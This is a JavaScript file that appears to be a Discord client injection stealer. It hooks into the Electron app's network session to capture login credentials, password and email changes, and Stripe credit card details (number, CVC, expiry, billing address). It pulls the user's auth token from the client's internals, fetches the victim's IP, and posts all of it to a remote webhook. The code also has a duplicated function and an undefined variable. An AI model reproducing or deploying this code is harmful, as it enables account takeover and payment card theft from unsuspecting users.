												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
										SendToWebhook(JSON.stringify(params))
									})
								})
							})
						})

					}
				})
			})
		})
	})
}

function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            var params = {
                username: "stenko",
                content: "",
                avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
                embeds: [
                    {
                        "color": 3092790,
                        "fields": [
                            {
                                "name": "**Email Changed**",
                                "value": `New Email: ${newemail}\nPassword: ${password}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": "stenko",
		 	    "url": `https://stenko.xyz`,
                        },
		        "thumbnail": {
                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": ""
                        }                 
                    }
                ]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
}

function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            var json = JSON.parse(info);
            var params = {
                username: "stenko",
                content: "",
                avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
                embeds: [
                    {
                        "color": 3092790,
                        "fields": [
                            {
                                "name": "**Credit Card Added**",
                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": "stenko",
		 	    "url": `https://stenko.xyz`,
                        },
		        "thumbnail": {
                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": ""
                        }     
                    }
                ]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
}
function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			var json = JSON.parse(info);
            var params = {
                username: "stenko",
                content: "",
                avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
                embeds: [
                    {
                        "color": 3092790,
                        "fields": [
                            {
                                "name": "**Credit Card Added**",
                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": "stenko",
		 	    "url": `https://stenko.xyz`,
                        },
		        "thumbnail": {
                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": ""
                        }     
                    }
                ]
            }
			SendToWebhook(JSON.stringify(params))
		})
	})
}
const ChangePasswordFilter = {
	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
				Login(email, password, token)
			}))
		} else {}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangePassword(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangeEmail(data.email, data.password, token)
					}))
				}
			}
		} else {}
	}
	if (details.url.endsWith("tokens")) {
		const window = BrowserWindow.getAllWindows()[0];
		const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
		window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
		}))
	}
});
module.exports = require('./core.asar')
